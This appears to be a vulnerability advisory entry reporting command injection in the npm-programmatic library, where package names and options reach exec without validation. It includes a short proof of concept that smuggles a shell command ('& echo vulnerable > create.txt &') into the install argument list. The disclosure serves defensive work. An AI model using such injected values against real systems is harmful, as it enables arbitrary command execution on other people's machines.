  title: Command Injection
  description: |
    [npm-programmatic][1] is a library that allows you to access npm
    commands programmatically from javascript.

    Affected versions of this package are vulnerable to Command Injection.
    The packages and option properties are concatenated together without any
    validation and are used by the `exec` function directly.

        var root = require("npm-programmatic");
        var attack_code = "& echo vulnerable > create.txt &";
        root.install([attack_code], {"cwd": "./"});
